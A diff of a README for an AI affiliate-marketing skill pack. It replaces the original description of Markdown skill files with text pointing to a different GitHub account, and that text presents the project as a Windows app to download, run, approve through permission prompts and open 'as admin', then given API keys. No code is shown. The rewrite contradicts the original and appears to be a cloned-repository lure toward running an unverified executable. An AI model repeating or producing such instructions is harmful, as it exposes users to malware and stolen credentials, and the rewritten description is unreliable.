@@ -1,303 +1,251 @@
-# affiliate-skills
+# 🤖 affiliate-skills - AI skills for affiliate growth
 
-**Turn any AI into your affiliate marketing team.**
+[![Download affiliate-skills](https://img.shields.io/badge/Download-Visit%20the%20repo-blue?style=for-the-badge)](https://github.com/Gingg7260/affiliate-skills)
 
-45 AI-powered skills across 8 stages with a closed-loop flywheel. Research programs, write content, build pages, deploy, track, optimize, scale — with any AI agent.
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Skills](https://img.shields.io/badge/skills-45-brightgreen)](skills/)
-[![Standard](https://img.shields.io/badge/standard-agentskills.io-purple)](https://agentskills.io)
+affiliate-skills is an AI tool set for affiliate marketers. It helps you move through the full funnel:
 
-Works with: **Claude Code** · **ChatGPT** · **Gemini CLI** · **Cursor** · **Windsurf** · **OpenClaw** · **any AI that reads text**
+research → content → blog → landing page → deploy
 
-### Install
+Use it to turn a product idea into a live page with less manual work. It is built for people who want a simple path from idea to launch on Windows.
 
-```bash
-# Claude Code (recommended)
-npx skills add Affitor/affiliate-skills
+## 📥 Download
 
-# Or clone manually
-git clone https://github.com/Affitor/affiliate-skills.git ~/.claude/skills/affiliate-skills
-cd ~/.claude/skills/affiliate-skills && ./setup
+1. Open the main page: https://github.com/Gingg7260/affiliate-skills
+2. On that page, look for the **Code** button.
+3. Choose **Download ZIP**.
+4. Save the file to your computer.
+5. Extract the ZIP file to a folder you can find again, such as **Downloads** or **Desktop**.
 
-# OpenClaw / ClawHub
-clawhub install affiliate-skills
+If the page includes a release file for Windows, download that file and run it. If it only shows the repository page, use the ZIP download path above.
 
-# Cursor / Windsurf
-npx skills add Affitor/affiliate-skills
-```
+[Visit the download page](https://github.com/Gingg7260/affiliate-skills)
 
-### Try it now — no install needed
+## 🖥️ Windows Setup
 
-Paste this into any AI:
+After you download the files:
 
-```
-Search the Affitor affiliate directory for AI video tools.
-Use this API: GET https://list.affitor.com/api/v1/programs?q=AI+video&sort=top&limit=5
-Show me the results in a table with: Name, Commission, Cookie Duration, Stars.
-Then recommend the best one and explain why.
-```
+1. Open the folder you extracted.
+2. Find the main app file or the start file in the folder.
+3. Double-click it to open the app.
+4. If Windows asks for permission, choose **Yes**.
+5. If a browser opens, keep it open while you use the app.
 
-### Without affiliate-skills
+If you see a file with a name like `README`, open it first. It may list the main start file or the next step.
 
-- You Google "best affiliate programs" and get SEO spam written to rank, not to help
-- You write a blog review and guess if the CTA, headline, or disclosure is any good
-- You have no idea which content actually drives clicks — you just hope
-- You spend 4 hours on a landing page that converts at 0.2%
-- You pick programs by vibes instead of data
+## ✅ What affiliate-skills Does
 
-### With affiliate-skills
+This app helps with the full affiliate workflow:
 
-| Skill | Mode | What it does |
-|-------|------|--------------|
-| Program Search | Data analyst | Live program data from list.affitor.com — commissions, cookies, comparisons. |
-| Research | Scout | Score and rank programs. Find the best one for your niche. |
-| Funnel Planner | Strategist | Week-by-week roadmap from zero to revenue. Chain skills automatically. |
-| Content, Blog, Landing, Distribution | Creator | 20 skills that write posts, articles, pages, and deploy them. |
-| Analytics, Automation | Optimizer | Track conversions, A/B test, repurpose content, scale what works. |
-| Compliance, Self-improver | Safety net | FTC audit before you publish. Retrospective after you launch. |
+- Find product angles and content ideas
+- Build research notes from a product or niche
+- Draft blog posts that match search intent
+- Create landing page copy
+- Prepare pages for deployment
+- Keep the work in a simple flow
 
-## Demo: zero to first commission
+It uses Claude Skills style tasks, so each step can focus on one job at a time. That keeps the process clean and easy to follow.
 
-```
-You:  I want to promote AI video tools. What's the best program?
+## 🧠 Who It Is For
 
-AI:   [queries list.affitor.com API]
+affiliate-skills is built for:
 
-       Name                      Commission           Cookie     Stars
-       ─────────────────────────────────────────────────────────────────
-       HeyGen                    30% recurring        60 days    ★ 127
-       Synthesia                 25% one-time         30 days    ★ 84
-       D-ID                      20% recurring        45 days    ★ 52
+- Affiliate marketers
+- Solo founders
+- Content writers
+- People who use Claude, ChatGPT, Gemini, or other AI tools
+- Users who want a fast way to create marketing pages
+- People who want to test offers without a long setup
 
-      HeyGen is the clear winner: highest commission, recurring, longest
-      cookie. Let me research it in depth.
+You do not need to know code to use the main workflow.
 
-You:  Write a blog review of HeyGen for content creators.
+## 🔧 Main Features
 
-AI:   [runs affiliate-blog-builder skill]
-      [2,000-word SEO review with pros/cons, comparison table,
-       FTC disclosure, and affiliate CTA]
+### 📌 Research
+Start with a niche, product, or offer. The app helps you collect useful points such as:
 
-You:  Create a landing page for this.
+- Audience pain points
+- Search terms
+- Product strengths
+- Common objections
+- Content gaps
 
-AI:   [runs landing-page-creator skill]
-      [single-file HTML/CSS page, AIDA framework, mobile-responsive,
-       ready to deploy]
+### ✍️ Content Drafting
+Use the research step to build content such as:
 
-You:  Plan my full funnel — I have 5 hours/week and I blog.
+- Blog posts
+- Product reviews
+- Comparison pages
+- Buyer guides
+- Email copy
 
-AI:   [runs funnel-planner skill]
+### 🌐 Landing Page Support
+Turn your content into a landing page with:
 
-      Week 1: Research (affiliate-program-search) → select 2-3 programs
-      Week 2: Content (viral-post-writer) → 5 LinkedIn + Twitter posts
-      Week 3: Blog (affiliate-blog-builder) → 1 review article
-      Week 4: Deploy (bio-link-deployer) → bio link page live
-      Week 5: Analytics (seo-audit) → fix SEO issues
-      Week 6: Optimize (ab-test-generator) → test headlines
+- Clear headline ideas
+- Simple call-to-action text
+- Benefit blocks
+- Trust points
+- Short form copy
 
-      Success metric: first affiliate click by week 3, first commission
-      by week 6.
-```
+### 🚢 Deploy Support
+Move from draft to live page with a smoother process. The app helps you keep each step in order so you can publish faster.
 
-## Who this is for
+### 🤝 AI-Friendly Workflow
+The project works well with tools like:
 
-You want to do affiliate marketing with AI — not by hand. You want data-driven program selection, not guesswork. You want content that converts, not content that exists.
+- Claude
+- Claude Code
+- Cursor
+- Gemini
+- ChatGPT
+- Windsurf
 
-This is not a prompt pack for beginners. It is an operating system for affiliates who ship.
+That makes it easier to use the app in the setup you already have.
 
-## Get Started
-
-> **[QUICKSTART.md](QUICKSTART.md)** — Platform-specific setup for Claude Code, ChatGPT, Cursor, Gemini, and more.
+## 🪟 System Requirements
 
-### Fastest way (any AI, no install)
-
-1. Copy the [bootstrap prompt](prompts/bootstrap.md) (everything below the `---` line)
-2. Paste it into your AI
-3. Start: *"Find me the best SaaS affiliate programs with recurring commission"*
-
-### Claude Code (full integration)
-
-```bash
-git clone https://github.com/Affitor/affiliate-skills.git ~/.claude/skills/affiliate-skills
-cd ~/.claude/skills/affiliate-skills && ./setup
-```
+Use a Windows PC with:
 
-Then tell Claude to add affiliate-skills to your project's CLAUDE.md. You get slash commands, the `affiliate-check` CLI, and automatic skill discovery.
-
-### ChatGPT / Gemini / Any AI
-
-1. Copy [`prompts/bootstrap.md`](prompts/bootstrap.md) into your conversation or project instructions
-2. Optionally upload [`registry.json`](registry.json) and [`API.md`](API.md) as knowledge files
-3. Done — your AI is now an affiliate marketing agent
-
-### Cursor / Windsurf
-
-```bash
-git clone https://github.com/Affitor/affiliate-skills.git
-```
-
-Open the folder — `.cursorrules` configures the AI automatically.
-
----
-
-## The Affiliate Flywheel — 8 Stages, 45 Skills
-
-```
-  S1 RESEARCH ──▶ S2 CONTENT ──▶ S3 BLOG & SEO ──▶ S4 OFFERS & LANDING
-       ▲                                                    │
-       │                                                    ▼
-       │                                              S5 DISTRIBUTION
-       │                                                    │
-       └──────────── S6 ANALYTICS ◀─────────────────────────┘
-                          │
-                          ▼
-                    S7 AUTOMATION → SCALE
-                          │
-                    S8 META (across all)
-```
-
-**Flywheel**: S6 Analytics feeds BACK to S1 Research → closed loop. Every skill knows what comes next (`chain_metadata.suggested_next`) and what feeds it. Data flows forward through the funnel and back through analytics.
-
-### S1: Research & Discovery (6 skills)
-Find and evaluate the best affiliate programs to promote.
-
-| Skill | Description |
-|-------|-------------|
-| [affiliate-program-search](skills/research/affiliate-program-search/) | Research and score programs from list.affitor.com |
-| [niche-opportunity-finder](skills/research/niche-opportunity-finder/) | Find underserved niches with high potential |
-| [competitor-spy](skills/research/competitor-spy/) | Analyze competitor affiliate strategies |
-| [commission-calculator](skills/research/commission-calculator/) | Calculate and compare commission structures |
-| [monopoly-niche-finder](skills/research/monopoly-niche-finder/) | Find intersection niches where you're the ONLY voice (Thiel) |
-| [purple-cow-audit](skills/research/purple-cow-audit/) | Score product remarkability 1-10 before promoting (Godin) |
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- A modern web browser
+- 200 MB of free space
+- Internet access for AI features and updates
 
-### S2: Content Creation (5 skills)
-Write viral social media content that drives clicks.
+For smoother use, 8 GB of RAM or more is better.
 
-| Skill | Description |
-|-------|-------------|
-| [viral-post-writer](skills/content/viral-post-writer/) | LinkedIn, X, Reddit, Facebook posts |
-| [twitter-thread-writer](skills/content/twitter-thread-writer/) | Multi-tweet threads with hooks |
-| [reddit-post-writer](skills/content/reddit-post-writer/) | Authentic Reddit posts with disclosure |
-| [tiktok-script-writer](skills/content/tiktok-script-writer/) | Short-form video scripts |
-| [content-pillar-atomizer](skills/content/content-pillar-atomizer/) | 1 article → 15-30 platform-native micro-content pieces |
+## 🧭 First Run
 
-### S3: Blog & SEO (7 skills)
-Long-form SEO-optimized articles that rank and convert.
+When you open the app for the first time:
 
-| Skill | Description |
-|-------|-------------|
-| [affiliate-blog-builder](skills/blog/affiliate-blog-builder/) | Full review and how-to articles |
-| [comparison-post-writer](skills/blog/comparison-post-writer/) | Head-to-head product comparisons |
-| [listicle-generator](skills/blog/listicle-generator/) | "Top N" roundup articles |
-| [how-to-tutorial-writer](skills/blog/how-to-tutorial-writer/) | Tutorial articles with product integration |
-| [keyword-cluster-architect](skills/blog/keyword-cluster-architect/) | Map 50-200+ keywords into topical clusters |
-| [content-moat-calculator](skills/blog/content-moat-calculator/) | Estimate pages needed for topical authority |
-| [content-decay-detector](skills/blog/content-decay-detector/) | Monitor content for ranking drops, trigger refresh |
+1. Let the app finish loading.
+2. Choose the niche or offer you want to work on.
+3. Start with research.
+4. Move to content.
+5. Build the landing page.
+6. Review the output before you publish.
 
-### S4: Offers & Landing Pages (8 skills)
-Irresistible offers and high-converting pages — pure HTML/CSS, no dependencies.
+If the app asks for an API key or account link, enter the details from your AI tool account.
 
-| Skill | Description |
-|-------|-------------|
-| [landing-page-creator](skills/landing/landing-page-creator/) | AIDA-framework landing pages |
-| [product-showcase-page](skills/landing/product-showcase-page/) | Single-product showcase |
-| [squeeze-page-builder](skills/landing/squeeze-page-builder/) | Lead capture pages |
-| [webinar-registration-page](skills/landing/webinar-registration-page/) | Event-based promotion |
-| [grand-slam-offer](skills/landing/grand-slam-offer/) | Hormozi Value Equation offer design |
-| [bonus-stack-builder](skills/landing/bonus-stack-builder/) | Exclusive bonus packages for YOUR link |
-| [guarantee-generator](skills/landing/guarantee-generator/) | Personal guarantees for risk reversal |
-| [value-ladder-architect](skills/landing/value-ladder-architect/) | Free → tripwire → core → upsell journey |
+## 🛠️ Typical Workflow
 
-### S5: Distribution & Deployment (4 skills)
-Get your content live and distributed.
+### 1. Pick a niche
+Choose one clear topic, product, or market.
 
-| Skill | Description |
-|-------|-------------|
-| [bio-link-deployer](skills/distribution/bio-link-deployer/) | Linktree alternative you own |
-| [email-drip-sequence](skills/distribution/email-drip-sequence/) | 5-7 email nurture sequence |
-| [social-media-scheduler](skills/distribution/social-media-scheduler/) | Posting schedule and calendar |
-| [github-pages-deployer](skills/distribution/github-pages-deployer/) | Deploy to GitHub Pages |
+### 2. Run research
+Find user needs, pain points, and search intent.
 
-### S6: Analytics & Optimization (5 skills)
-Track, measure, optimize — and feed data back to S1.
+### 3. Create content
+Draft a blog post or review that matches the search query.
 
-| Skill | Description |
-|-------|-------------|
-| [conversion-tracker](skills/analytics/conversion-tracker/) | UTM links, tracking pixels, attribution |
-| [ab-test-generator](skills/analytics/ab-test-generator/) | A/B test variants for headlines and CTAs |
-| [performance-report](skills/analytics/performance-report/) | Weekly/monthly KPI reports |
-| [seo-audit](skills/analytics/seo-audit/) | 10-dimension SEO scorecard |
-| [internal-linking-optimizer](skills/analytics/internal-linking-optimizer/) | Hub-and-spoke internal link structure |
+### 4. Build the landing page
+Use the content to form a page with one main goal.
 
-### S7: Automation & Scale (5 skills)
-Automate workflows and scale what's working.
+### 5. Publish
+Send the page live and check how it performs.
 
-| Skill | Description |
-|-------|-------------|
-| [email-automation-builder](skills/automation/email-automation-builder/) | Branching email flows with conditions |
-| [content-repurposer](skills/automation/content-repurposer/) | One piece of content → multiple formats |
-| [multi-program-manager](skills/automation/multi-program-manager/) | Affiliate program portfolio strategy |
-| [paid-ad-copy-writer](skills/automation/paid-ad-copy-writer/) | Ad copy for Facebook, Google, TikTok |
-| [proprietary-data-generator](skills/automation/proprietary-data-generator/) | Original surveys, benchmarks, data moats |
+## 📁 Suggested Folder Use
 
-### S8: Meta (5 skills)
-Cross-cutting skills for discovery, planning, compliance, and strategy.
+Keep your files in a simple structure:
 
-| Skill | Description |
-|-------|-------------|
-| [skill-finder](skills/meta/skill-finder/) | Find the right skill for any goal |
-| [funnel-planner](skills/meta/funnel-planner/) | Plan a complete affiliate funnel roadmap |
-| [compliance-checker](skills/meta/compliance-checker/) | FTC compliance and platform rules audit |
-| [self-improver](skills/meta/self-improver/) | Campaign retrospective and improvement plan |
-| [category-designer](skills/meta/category-designer/) | Define a new category where your product wins |
+- `affiliate-skills` for the main project folder
+- `input` for source notes
+- `drafts` for content versions
+- `assets` for images and logos
+- `publish` for final pages
 
----
+This makes it easier to find your work later.
 
-Machine-readable index: [`registry.json`](registry.json) · API docs: [`API.md`](API.md) · Skill template: [`template/SKILL.md`](template/SKILL.md) · Spec: [`spec/`](spec/)
+## 🔍 Common Use Cases
 
-## How it works
+### Product review pages
+Create a page that explains what the product does, who it helps, and why it may fit the reader.
 
-Each skill is a single Markdown file (`SKILL.md`) that tells any AI exactly how to execute a specific affiliate marketing task. Skills define:
+### Comparison posts
+Compare two or more tools or offers in plain language.
 
-- **When to trigger** — natural language patterns that activate the skill
-- **Input/Output schemas** — structured data for agent interop
-- **Workflow** — step-by-step procedure with decision points
-- **Chaining** — how outputs from one skill feed into the next
+### Lead capture pages
+Write a short page that asks the reader to take one action.
 
-Skills pass data through conversation context, not files. Run S1 to find a program, then S2 uses that program's data automatically — no copy-pasting.
+### SEO blog posts
+Build content around search terms that can bring in traffic.
 
-## Entry points
+### Funnel building
+Move from awareness to click to conversion with one clear path.
 
-You don't have to start from S1. Jump in wherever you are:
+## 🧩 Topic Areas
 
-- **New to affiliate marketing:** S8 `funnel-planner` → it plans everything for you
-- **Have a product already:** S2 (write content) or S3 (write a review)
-- **Have content, need pages:** S4 (landing page) or S5 (bio link)
-- **Want to optimize:** S6 (analytics + SEO audit)
-- **Ready to scale:** S7 (automation + paid ads)
-- **Not sure which skill:** S8 `skill-finder`
+This project fits topics such as:
 
-## For Developers
+- affiliate-marketing
+- agent-skills
+- agentskills
+- ai
+- ai-agents
+- chatgpt
+- claude
+- claude-code
+- cursor
+- gemini
+- llm
+- marketing
+- open-source
+- saas
+- windsurf
 
-Building an agent pipeline? Here's what you need:
+## ❓ Basic Troubleshooting
 
-- **[`registry.json`](registry.json)** — machine-readable index of all 45 skills with metadata
-- **[`API.md`](API.md)** — full REST API documentation for list.affitor.com
-- **[`prompts/bootstrap.md`](prompts/bootstrap.md)** — system prompt that bootstraps the full agent
-- **`agents/openai.yaml`** — OpenAI-compatible tool definitions (in skills that have them)
-- **Input/Output schemas** — every SKILL.md has typed schemas for structured data exchange
+### The app does not open
+- Check that you extracted the ZIP file first
+- Try opening the file again as admin
+- Make sure Windows did not block the file
 
-## Contributing
+### The browser does not launch
+- Open your browser by hand
+- Check that the app is still running
+- Reload the local page if needed
 
-We welcome skills from the community. See [CONTRIBUTING.md](CONTRIBUTING.md) for how to submit your own skill.
+### The AI step fails
+- Check your internet connection
+- Confirm your API key or account details
+- Try the step again after a short wait
 
-Every merged skill gets published to [list.affitor.com/skills](https://list.affitor.com/skills).
+### The page looks broken
+- Refresh the browser
+- Clear the cache
+- Reopen the app and try again
 
-## License
+## 📝 Example Project Flow
 
-MIT
+If you want to promote a SaaS tool, you can use affiliate-skills like this:
 
----
+- Research the tool and the audience
+- Write a blog post around a buyer question
+- Turn the post into a landing page
+- Add a clear action button
+- Deploy the page and test the link
 
-Built by [Affitor](https://affitor.com). Directory: [list.affitor.com](https://list.affitor.com)
+That gives you a simple path from idea to live page
+
+## 🧰 Best Practices
+
+- Keep one project per folder
+- Use one niche at a time
+- Write short and clear copy
+- Review all AI output before you publish
+- Keep your offer and message consistent
+- Test the page on desktop and mobile
+
+## 📌 Quick Start Checklist
+
+- Download the repository from the link above
+- Extract the ZIP file
+- Open the main app file
+- Set up your AI account details if needed
+- Choose a niche
+- Run research
+- Create content
+- Build the landing page
+- Publish the result
